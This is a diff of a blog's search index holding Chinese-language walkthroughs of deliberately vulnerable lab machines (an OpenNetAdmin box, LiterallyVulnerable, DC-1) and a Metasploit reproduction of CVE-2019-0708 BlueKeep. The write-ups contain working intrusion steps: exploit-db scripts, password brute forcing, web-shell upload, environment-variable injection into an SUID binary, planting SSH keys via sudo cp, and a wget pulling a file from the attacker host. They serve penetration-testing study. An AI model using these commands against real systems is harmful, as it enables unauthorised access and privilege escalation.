+<p><img src="2020-02-14-14-45-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<p>搜索相关漏洞，得到远程命令执行：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit opennetadmin</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-02-14-14-44-52%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<h2 id="海滩登陆"><a href="#海滩登陆" class="headerlink" title="海滩登陆"></a>海滩登陆</h2><br>
+
+<p>使用 <code>47691.sh</code> 如果报错的话，可以先 <code>dos2unix</code> 转换一下格式，作者可能在 <code>dos</code> 环境下写的脚本</p>
+<br>
+
+<p><img src="2020-02-14-18-38-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+<br>
+
+<p>使用 MSF：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先复制到桌面</span></span><br><span class="line">cp /usr/share/exploitdb/exploits/php/webapps/47772.rb ~/Desktop/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制到 MSF 内利用</span></span><br><span class="line">cp 47772.rb /usr/share/metasploit-framework/modules/exploits/</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><img src="2020-02-14-15-10-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
+<br>
+
+<p>测试发现存在 <code>Python</code> 使用交互式 shell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; shell</span><br><span class="line"></span><br><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>先看 <code>/etc/passwd</code> 有多少用户及有价值信息。目录全无访问权</p>
+<br>
+
+<p><img src="2020-02-14-15-13-04%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
+<p><img src="2020-02-14-15-13-36%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<p>这个时就需要最后的搜刮一下，得到了一组用户密码。其他用户，无有价值信息：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -ri --color=auto --exclude-dir=proc/ <span class="string">'douglas'</span> / 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><img src="2020-02-14-15-28-42%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
+<p><img src="2020-02-14-15-30-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<hr>
+<br>
+
+<p>Hash 破解，没跑成来，查了一下，会用到作者给的提示 <code>aefhrt</code>。使用 <code>crunch</code> 生产字典：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ crunch 10 10 aefhrt &gt;word.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">$ crunch 10 10 aefhrt -o word.txt</span><br><span class="line"></span><br><span class="line">$ john --wordlist=word.txt <span class="built_in">hash</span> </span><br><span class="line">$ john --show <span class="built_in">hash</span> </span><br><span class="line"></span><br><span class="line">?:fatherrrrr</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><img src="2020-02-14-15-51-31%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<h2 id="身份切换-SSH免密登陆"><a href="#身份切换-SSH免密登陆" class="headerlink" title="身份切换(SSH免密登陆)"></a>身份切换(SSH免密登陆)</h2><br>
+
+<p>登录 SSH，得到普通用户，目录下除了 <code>.ssh/</code> 外无其他有价值信息。</p>
+<p>可使用的 <code>sudo</code> 命令为 <code>cp</code> ：</p>
+<br>
+
+<p><img src="2020-02-14-16-03-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<p>涉及知识的盲区了，特地去查询记录了一下</p>
+<br>
+
+<p><code>cp</code> 命令可以配合  <code>SSH（authorized_keys）</code> 免密登录到其他用户：</p>
+<br>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 为目标生成 ssh key</span></span><br><span class="line">ssh-keygen -b 2048</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制生成的 id_rsa.pub 到 /tmp 下并改名为 authorized_kes</span></span><br><span class="line">cp /home/douglas/.ssh/id_rsa.pub /tmp/authorized_kes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 改变 authorized_kes 的权限</span></span><br><span class="line">chmod 777 authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制到目标 .ssh/ 下</span></span><br><span class="line">sudo -u jen /bin/cp authorized_keys /home/jen/.ssh/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登陆</span></span><br><span class="line">ssh jen@127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<br>
+
+<p><img src="2020-02-14-16-16-13%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<p><img src="2020-02-14-16-18-58%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<p>说是有邮件，查看邮件，得到另一组用户名和密码，登陆成功。</p>
+<br>
+
+
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><br>
+
+<p>看目录，得到一个 <code>SUID</code> 的二进制文件，可以直接成为 <code>root</code> ，进 <code>root</code> 目录，得到 Flag</p>
+<br>
+<br>
+
+<p><img src="2020-02-14-16-25-30%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<p><img src="2020-02-14-16-28-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<hr>
+<br>
+
+<p>与其说是提权，不如说是作者准备好的外挂道具，让你可以一举成神，有种欲求不满的感觉，前面刚鼓起的劲，到了后面直接一键 <code>root</code> ，无法满足啊</p>
+<br>
+
+<p>不过，也是学到技能了</p>
+<br>
+
+<p>也可以使用如下方式：</p>
+<ul>
+<li>创建一个权限 <code>777</code> 的文件</li>
+<li>使用 <code>find</code> 命令查找 <code>Jen</code> 创建的文件</li>
+<li>使用 <code>cp</code> 命令，复制找到的文件 到 <code>777</code> 权限的 文件</li>
+<li><code>cat</code> 查看</li>
+</ul>
+<br>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sudo -u</span></span><br><span class="line">-u, --user=user              <span class="comment"># 以指定用户或 ID</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u jen /bin/cp /var/mail/jen ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>vulnhub</tag>
+        <tag>OSCP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2019-0708复现</title>
+    <url>/2019/09/12/CVE-2019-0708%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p>CVE-2019-0708 远程桌面服务的远程代码执行漏洞, 漏洞触发无需用户交互</p>
+<a id="more"></a>
+
+<blockquote>
+<p>A remote code execution vulnerability exists in Remote Desktop Services formerly known as Terminal Services when an unauthenticated attacker connects to the target system using RDP and sends specially crafted requests, aka ‘Remote Desktop Services Remote Code Execution Vulnerability’. —— <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0708" target="_blank" rel="noopener">CVE</a></p>
+</blockquote>
+<br>
+
+<p>复现环境:</p>
+<ul>
+<li>Windows 7 (Build 7601, Service Pack 1) x64</li>
+<li>Windows server 2008 R2 x64</li>
+<li>Metaspliot (Ubuntu Server)</li>
+</ul>
+<blockquote>
+<p>初始版本的 Exp只适用于64位版本的 Windows 7和 Windows server 2008 R2</p>
+</blockquote>
+<br>
+
+<p>更新 MSF到最新（<strong>5.0.47</strong>）版本，推荐使用 Curl更新（需要删除旧版）：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>因为这个 pull不是正式的，所以需要自行比对 diff增删或者<strong>直接替换</strong>文件: <a href="https://github.com/rapid7/metasploit-framework/pull/12283/files" target="_blank" rel="noopener">Pull 地址</a></p>
+<p>这里已下载完成，可直接替换使用(建议去 Pull下载，万一就更新了呢)：</p>
+<ul>
+<li><a href="./Tools/rdp.rb">rdp.rb</a></li>
+<li><a href="./Tools/cve_2019_0708_bluekeep.rb">cve_2019_0708_bluekeep.rb</a></li>
+<li><a href="./Tools/rdp_scanner.rb">rdp_scanner.rb</a></li>
+<li><a href="./Tools/cve_2019_0708_bluekeep_rce.rb">cve_2019_0708_bluekeep_rce.rb</a></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 对应的替换文件</span></span><br><span class="line"></span><br><span class="line">lib/msf/core/exploit/rdp.rb</span><br><span class="line">modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br><span class="line">modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line">modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><img src="./2019-09-11%2020-43-34%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="000" title="可以正常搜索到"></p>
+<br>
+
+<p>执行 <code>exploit</code></p>
+<p><img src="./2019-09-12%2012-42-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="000" title="按需选择 target"><br><img src="./2019-09-12%2015-36-27%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="001" title="目标机远程选项选第 3项会报无漏洞"><br><img src="./2019-09-10%2014-46-40%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="002" title="返回 shell"><br><img src="./2019-09-10%2020-38-27%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="003" title="返回 meterpreter"><br><img src="./cve-2019-0708_win2k8_2.gif" alt="004" title="Win2k8进行 expliot出现蓝屏重启情况(第一次蓝屏)"></p>
+]]></content>
+      <tags>
+        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
@@ -1418,182 +1436,6 @@ nslookup会得到 DNS解析服务器保存在缓存中的非权威解答
 <p>卡在了 <code>FTP</code> 抓包的位置，还是经验不足</p>
 <p>前期收集的信息必定是有用的，<code>FTP</code> 使用明文传输密码，只需要抓包，就可以得到</p>
 <p>查看系统正在运行的进程也要加入信息收集里面</p>
-]]></content>
-      <categories>
-        <category>vulnhub</category>
-      </categories>
-      <tags>
-        <tag>vulnhub</tag>
-        <tag>OSCP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>LiterallyVulnerable</title>
-    <url>/2020/03/19/LiterallyVulnerable/</url>
-    <content><![CDATA[<blockquote>
-<p>2020-03-08 14:26 — 2020-03-09</p>
-</blockquote>
-<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Flags</span>: <span class="number">3</span> (local.txt, user.txt &amp; root.txt)</span><br><span class="line">Difficulty <span class="attribute">Level</span>: Initial Shell (Easy) - Privileges Escalation (Intermediate)</span><br><span class="line"><span class="attribute">Website</span>: <span class="attribute">https</span>:<span class="comment">//ebryx.com</span></span><br><span class="line"><span class="attribute">Hint</span>: Maybe, you hasted and left some open holes unchecked?</span><br><span class="line">Literally Vulnerable is supposed to give beginners a taste of real-world scenarios and OSCP machines at the same time! It was inspired highly by the <span class="variable">@DC</span> series.</span><br><span class="line"></span><br><span class="line">You're supposed to know the big three (EEEs) Enumeration, Exploitation &amp; Escalation of pentesting to pwn the machine. The machine is supposed to be beginner-friendly and the difficulty level is Easy-Intermediate depending on your knowledge. You need to have enough information about Linux file types &amp; permissions for privileges escalation.</span><br><span class="line"></span><br><span class="line">Technical <span class="attribute">Information</span>:</span><br><span class="line">Just download, extract and load the .vmx file in VMware Workstation (tested on VMware Workstation <span class="number">15</span>.x.x)</span><br><span class="line">The adapter is currently NAT, networking is configured for DHCP and IP will get assigned automatically</span><br><span class="line"><span class="attribute">Contact</span>:</span><br><span class="line">You can either contact me on twitter <span class="variable">@syed__umar</span> or linkedin (/in/syedumararfeen/) for hints!</span><br><span class="line">There are three flags in the <span class="attribute">machine</span>: local.txt, user.txt &amp; root.txt. You're supposed to grab all three in order to completely pwn the machine. Hope you like the machine, best of luck! :)</span><br><span class="line"></span><br><span class="line">I'll try my best to continue with the series!</span><br><span class="line">--------</span><br><span class="line"><span class="attribute">From </span>: <span class="attribute">https</span>:<span class="comment">//www.vulnhub.com/entry/ua-literally-vulnerable,407/</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali：172.16.252.129</span><br><span class="line">目标：172.16.252.1/24</span><br></pre></td></tr></table></figure>
-
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主机存活：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -n -sn -T5 -v 172.16.252.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure>
-
-<p>目标端口服务：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -n -Pn -sV -O 172.16.252.131</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    nginx 1.14.0 (Ubuntu)</span><br></pre></td></tr></table></figure>
-
-<p>全部端口：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT STATE SERVICE VERSION</span><br><span class="line">21/tcp open ftp vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r-- 1 ftp ftp 325 Dec 04 13:05 backupPasswords </span><br><span class="line">| ftp-syst:</span><br><span class="line">| 	STAT:</span><br><span class="line">| FTP server status:</span><br><span class="line">| Connected to ::ffff:172.16.252.129</span><br><span class="line">| Logged <span class="keyword">in</span> as ftp</span><br><span class="line">| TYPE: ASCII</span><br><span class="line">| No session bandwidth <span class="built_in">limit</span></span><br><span class="line">| Session timeout <span class="keyword">in</span> seconds is 300</span><br><span class="line">| Control connection is plain text</span><br><span class="line">| Data connections will be plain text</span><br><span class="line">| At session startup, client count was 1</span><br><span class="line">| vsFTPd 3.0.3 - secure, fast, stable </span><br><span class="line">|_End of status</span><br><span class="line">22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) </span><br><span class="line">| ssh-hostkey:</span><br><span class="line">| 2048 2f:26:5b:e6:ae:9a:c0:26:76:26:24:00:a7:37:e6:c1 (RSA)</span><br><span class="line">| 256 79:c0:12:33:d6:6d:9a:bd:1f:11:aa:1c:39:1e:b8:95 (ECDSA) </span><br><span class="line">|_ 256 83:27:d3:79:d0:8b:6a:2a:23:57:5b:3c:d7:b4:e5:60 (ED25519)</span><br><span class="line">80/tcp open http nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-generator: WordPress 5.3</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Not so Vulnerable &amp;<span class="comment">#8211; Just another WordPress site </span></span><br><span class="line">|_http-trane-info: Problem with XML parsing of /evox/about</span><br><span class="line">65535/tcp open http </span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br></pre></td></tr></table></figure>
-
-<p>开启的端口：21、22、80、65535</p>
-<h3 id="FTP-匿名登陆"><a href="#FTP-匿名登陆" class="headerlink" title="FTP 匿名登陆"></a>FTP 匿名登陆</h3><p>FTP 可以匿名访问，得到几个密码，暂不知用途：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*<span class="variable">$eGRIf7v38s</span>&amp;p7 </span><br><span class="line">yP$*SV09YOrx7mY </span><br><span class="line">GmceC&amp;oOBtbnFCH </span><br><span class="line">3!IZguT2piU8X<span class="variable">$c</span> </span><br><span class="line">P&amp;s%F1D4<span class="comment">#KDBSeS</span></span><br><span class="line"><span class="variable">$EPid</span>%J2L9LufO5 </span><br><span class="line">nD!mb*aHON&amp;76&amp;G </span><br><span class="line">$*Ke7q2ko3tqoZo </span><br><span class="line">SCb<span class="variable">$I</span>^gDDqE34fA </span><br><span class="line">Ae%tM0XIWUMsCLp</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-03-08-14-48-33%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08 14-48-33屏幕截图"></p>
-<p> <img src="2020-03-08-14-49-20%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08 14-49-20屏幕截图">  </p>
-<h3 id="Web-目录枚举"><a href="#Web-目录枚举" class="headerlink" title="Web 目录枚举"></a>Web 目录枚举</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">80/tcp open http nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-generator: WordPress 5.3</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: <span class="keyword">Not</span> so Vulnerable &amp;#8211; Just another WordPress site </span><br><span class="line">|_http-trane-info: Problem with XML parsing of /evox/about</span><br><span class="line">65535/tcp open http </span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu<span class="built_in"> Default </span>Page: It works</span><br></pre></td></tr></table></figure>
-
-<p>80 端口： nginx + Wordpress</p>
-<p>65535端口：Apache</p>
-<p>控制台显示资源请求错误多，可以看到它是从 <code>literally.vulnerable</code> 请求资源，可以设置 DNS：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"172.16.252.131    literally.vulnerable"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-03-08-14-54-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08 14-54-43屏幕截图"></p>
-<p>先扫描 65535 端口，逐一访问，得到 <code>phpcms</code> 页面，访问需要密码，<code>wpsacn</code> 枚举</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch.py -u <span class="string">"http://172.16.252.131:65535"</span> -e php --random-agents -w /usr/share/wordlists/dirb/big.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-03-08-15-13-12%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08-15-13-12屏幕截图"> </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://172.16.252.131:65535/phpcms/ --enumerate</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] maybeadmin</span><br><span class="line">| Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line">[+] notadmin</span><br><span class="line">| Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>
-
-<p>得到两个用户名，使用前面得到的几个密码枚举爆破，碰运气，得到一组用户名密码：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://172.16.252.131:65535/phpcms/ -U users.txt -P backupPasswords</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[i] Valid Combinations Found:</span><br><span class="line">| Username: maybeadmin, Password:<span class="variable">$EPid</span>%J2L9LufO5</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-03-08-16-25-38%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08-16-25-38屏幕截图"></p>
-<h3 id="登录-Wordpress-后台"><a href="#登录-Wordpress-后台" class="headerlink" title="登录 Wordpress 后台"></a>登录 Wordpress 后台</h3><p>都翻了一遍，得到一组用户名和密码：</p>
-<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">notadmin:Pa<span class="symbol">$</span><span class="symbol">$</span>w0rd13!&amp;</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-03-08-16-41-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08-16-41-43屏幕截图"> </p>
-<h2 id="登录系统-Getshell"><a href="#登录系统-Getshell" class="headerlink" title="登录系统(Getshell)"></a>登录系统(Getshell)</h2><p>利用 <code>MSF</code> 上传木马 getshell</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exploit/unix/webapp/wp_admin_shell_upload</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-03-09-18-18-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-18-18-23屏幕截图"></p>
-<h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer : literallyvulnerable</span><br><span class="line">OS : Linux literallyvulnerable 4.15.0-88-generic <span class="comment">#88-Ubuntu SMP Tue Feb 11 20:11:34 UTC 2020 x86_64</span></span><br><span class="line">Meterpreter : php/linux</span><br><span class="line">meterpreter &gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">######## lsb_release #############</span></span><br><span class="line">www-data@literallyvulnerable:$ lsb_release -a lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description: Ubuntu 18.04.3 LTS</span><br><span class="line">Release: 18.04</span><br><span class="line">Codename: bionic</span><br><span class="line"></span><br><span class="line"><span class="comment">####### /etc/passwd #######</span></span><br><span class="line">doe:x:1001:1001:Doe,,,:/home/doe:/bin/bash </span><br><span class="line">john:x:1000:1000:,,,:/home/john:/bin/bash</span><br></pre></td></tr></table></figure>
-
-<p>寻找 SUID 程序，得到可疑文件：<code>itseasy</code> </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-03-09-19-27-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-19-27-43屏幕截图"> </p>
-<h2 id="权限提升-User"><a href="#权限提升-User" class="headerlink" title="权限提升(User)"></a>权限提升(User)</h2><p>运行 <code>itseasy</code> 得到当前目录绝对路径，看过一篇通过操控 <code>PATH</code> 参数值进行提权；怀疑程序调用了 <code>pwd</code> 命令</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">cp /bin/bash /tmp/<span class="built_in">pwd</span>    <span class="comment"># or echo "/bin/bash" &gt; /tmp/pwd</span></span><br><span class="line">chmod 777 /tmp/<span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
-
-<p>执行后，没有得到预期的结果</p>
-<p><code>objdump -d</code> 一下，看到个 <code>getenv</code> 函数，用来获取环境变量</p>
-<p>也就是可以通过改变环境变量的值来控制这个程序：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PWD=\$\(/bin/bash\)</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-03-09-20-28-54%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-28-54屏幕截图"> </p>
-<p><img src="2020-03-09-19-42-16%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-19-42-16屏幕截图"></p>
-<p>然后输入命令没有回显了，直接 SSH ：kali 下生成 ssh 公钥上传到目标机</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/john/.ssh &amp;&amp; wget http://172.16.252.129:8848/autorized_keys</span><br></pre></td></tr></table></figure>
-
-<h3 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h3><p>HOME 目录下的到一个 base64加密的密码</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">am9objpZWlckczhZNDlJQiNaWko= </span><br><span class="line"><span class="built_in">echo</span><span class="string">"am9objpZWlckczhZNDlJQiNaWko="</span>| base64 -d </span><br><span class="line"></span><br><span class="line">john:YZW<span class="variable">$s8Y49IB</span><span class="comment">#ZZJ</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-03-09-19-54-52%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-19-54-52屏幕截图"> </p>
-<p><img src="2020-03-09-20-02-37%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-02-37屏幕截图"> </p>
-<p><img src="2020-03-09-20-05-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-05-51屏幕截图"></p>
-<p>搜索 SUID 程序：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find/ -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudopasswd root</span><br><span class="line">Sorry, user john is not allowed to execute <span class="string">'/usr/bin/passwd root'</span> as root on literallyvulnerable.</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries forjohn on literallyvulnerable:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/</span><br><span class="line">sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line">    User john may run the following commands on literallyvulnerable: </span><br><span class="line">        (root) /var/www/html/test.html</span><br></pre></td></tr></table></figure>
-
-<p>可以运行 <code>/var/www/html/test.html</code> </p>
-<h2 id="权限提升-root"><a href="#权限提升-root" class="headerlink" title="权限提升(root)"></a>权限提升(root)</h2><p><code>/var/www/html</code> 目录下没有 <code>test.html</code> 文件，且 <code>john</code> 没有 <code>html</code> 目录的写权限，那就切换回 <code>www-data</code> 用户创建文件</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"/bin/bash"</span> &gt; test.html</span><br><span class="line">chmod 777 test.html</span><br></pre></td></tr></table></figure>
-
-<p><code>sudo</code> 运行，提权成功</p>
-<p><img src="2020-03-09-20-19-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-19-09屏幕截图"></p>
-<p><img src="2020-03-09-20-21-25%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-21-25屏幕截图"> </p>
-<p><img src="2020-03-09-20-21-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-21-43屏幕截图"> </p>
-]]></content>
-      <categories>
-        <category>vulnhub</category>
-      </categories>
-      <tags>
-        <tag>vulnhub</tag>
-        <tag>OSCP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DC-1</title>
-    <url>/2020/03/19/DC-1/</url>
-    <content><![CDATA[<blockquote>
-<p>2020-03-17</p>
-</blockquote>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">22/tcp open ssh OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">80/tcp open http Apache httpd 2.2.22 ((Debian))</span><br><span class="line">111/tcp open rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br></pre></td></tr></table></figure>
-
